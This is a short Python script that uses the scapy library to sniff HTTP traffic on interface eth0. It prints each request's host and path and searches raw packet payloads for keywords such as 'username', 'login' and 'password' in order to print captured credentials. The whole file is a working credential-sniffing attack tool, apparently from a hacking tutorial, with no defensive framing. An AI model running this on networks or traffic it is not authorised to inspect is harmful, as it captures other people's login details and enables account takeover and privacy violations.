#!/usr/bin/env python3
import scapy.all
import scapy.layers.l2
from scapy.layers import http


#  prn is to specify a callback function.
def sniff(interface):
    scapy.all.sniff(iface=interface, store=False, prn=sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def login_info(packet):
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load
        keywords = [b"uname", b"username", b"login", b"login_user", b"user", b"password", b"pass", b"login_pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("- HTTP Request >> " + url.decode())

        login = login_info(packet)
        if login:
            print("\n- Possible credentials >> " + login.decode() + "\n")


sniff("eth0")
